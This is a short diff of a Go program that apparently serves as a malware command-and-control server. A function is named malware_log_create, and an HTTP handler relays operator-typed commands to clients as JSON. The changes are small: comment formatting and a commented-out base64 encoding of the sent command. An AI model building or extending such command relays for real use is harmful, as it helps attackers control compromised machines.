@@ -18,7 +18,7 @@ func check(e error) {
 	}
 }
 
-//Log functionality
+// Log functionality
 func malware_log_create() {
 	dt := time.Now()
 
@@ -134,9 +134,11 @@ func main() {
 			command_input = scanner.Text()
 			fmt.Println("Sending Command", command_input)
 		}
-		//fmt.Scanln(&command_input)
-		//fmt.Println("Sending ", command_input)
+
+		//encodedInput := base64.StdEncoding.EncodeString(command_input)
+		//c.JSON(200, gin.H{"cmd": encodedInput})
 		c.JSON(200, gin.H{"cmd": command_input})
+
 		defer c.Request.Body.Close()
 	})
 
